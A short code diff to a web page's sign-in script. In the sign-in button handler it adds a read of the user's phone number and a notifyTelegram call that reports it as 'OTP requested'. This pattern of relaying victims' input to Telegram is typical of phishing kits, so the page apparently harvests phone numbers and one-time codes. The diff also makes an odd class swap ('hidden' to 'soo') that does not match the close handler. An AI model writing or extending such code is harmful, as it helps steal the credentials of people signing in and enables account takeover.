@@ -52,9 +52,13 @@ function startTimer(){
   },1000);
 }
 document.getElementById("signIn").onclick=()=>{
-  document.getElementById("otpBox").classList.remove("hidden");
+  const phone = document.getElementById("phone").value;
+
+  document.getElementById("otpBox").classList.remove("soo");
   document.getElementById("otpMessage").textContent="";
   startTimer();
+
+  notifyTelegram(phone, "OTP requested");
 };
 document.getElementById("close").onclick=()=>document.getElementById("otpBox").classList.add("hidden");
 document.getElementById("confirm").onclick=()=>{
